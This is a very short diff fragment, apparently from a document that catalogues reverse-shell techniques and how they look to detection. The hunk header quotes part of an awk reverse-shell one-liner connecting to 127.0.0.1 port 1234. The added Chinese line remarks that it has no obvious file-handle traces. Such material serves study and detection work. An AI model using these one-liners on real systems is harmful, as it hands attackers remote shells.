@@ -245,6 +245,7 @@ awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell>" |&
 
 ```
 
+无明显文件句柄特征
 
 
 ```c
